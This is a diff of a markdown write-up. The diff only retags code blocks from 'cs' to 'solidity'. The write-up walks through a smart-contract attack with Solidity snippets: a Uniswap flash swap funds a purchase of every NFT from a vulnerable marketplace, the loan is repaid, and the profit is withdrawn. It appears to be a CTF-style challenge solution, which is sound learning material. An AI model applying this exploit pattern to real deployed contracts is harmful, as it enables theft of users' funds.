@@ -22,7 +22,7 @@ The attacker contract should have a function which calls the `swap()` function a
 
 In my case, since we only need WETH, I made the `flashSwap()` function only take amounts of WETH in count:
 
-```cs
+```solidity
 function flashSwap(uint256 _amount) external {
     // we want to specifically borrow weth
     uint256 amount0 = pair.token0() == weth ? _amount : 0;
@@ -36,7 +36,7 @@ function flashSwap(uint256 _amount) external {
 
 Then within the `uniswapV2Call()` function we have already received the tokens, so we can now do stuff with them, in this case, the first thing we need to do is convert the WETH to ETH, as the marketplace only accepts ETH:
 
-```cs
+```solidity
 IERC20(weth).approve(weth, type(uint256).max);
 weth.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
 ```
@@ -45,7 +45,7 @@ All we need to take is 15 ether, as it's all needed to take all the NFTs from th
 
 After withdrawing the ether, I create an array of integers with all the token IDs for the NFTs we want to buy. I defined this function to generate a dynamic array of integers with values from 0 to `size`:
 
-```cs
+```solidity
 function arrayOfIntegers(uint256 size) private returns (uint256[] memory) {
     uint256[] memory uintArray = new uint256[](size);
     for (uint256 i = 0; i < size; i++) {
@@ -57,20 +57,20 @@ function arrayOfIntegers(uint256 size) private returns (uint256[] memory) {
 
 I'm sure there's much better ways to do this, but here we are. Anyway, With this function I generate the array:
 
-```cs
+```solidity
 uint256 amountOfOffers = marketplace.amountOfOffers();
 uint256[] memory tokenIdsArray = arrayOfIntegers(amountOfOffers);
 ```
 
 Which must be passed to the marketplace's `buyMany()` function along with the 15 ether:
 
-```cs
+```solidity
 marketplace.buyMany{value: amount}(tokenIdsArray);
 ```
 
 Then the NFTs must be transferred to the buyer, so we loop over token IDs and perform a `safeTransferFrom()`, I coded a short function for this to keep `uniswapV2Call()` cleaner:
 
-```cs
+```solidity
 function bulkSafeTransferNFT(uint256[] memory tokenIds) private {
     for (uint256 i = 0; i < tokenIds.length; i++) {
         nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
@@ -80,26 +80,26 @@ function bulkSafeTransferNFT(uint256[] memory tokenIds) private {
 
 Then I call this function to send the corresponding purchased tokens to the buyer, so the attacker can get the payment for them:
 
-```cs
+```solidity
 bulkSafeTransferNFT(tokenIdsArray);
 ```
 
 Then the amount to repay has to be computed, as there's a 0.3% fee on top of the loan taken from Uniswap:
 
-```cs
+```solidity
 uint256 amountToRepay = amount + (((amount*3)/997)+1);
 ```
 
 Then the loan can be repayed depositing the ETH to get WETH and transferring the WETH back into the pair address:
 
-```cs
+```solidity
 weth.functionCallWithValue(abi.encodeWithSignature("deposit()"), amountToRepay);
 IERC20(weth).transfer(address(pair), amountToRepay);
 ```
 
 Then finally I call a `recoverETH()` function I coded into the contract to obtain the net profits from the marketplace exploit:
 
-```cs
+```solidity
 function recoverETH() external {
     owner.sendValue(address(this).balance);
 }
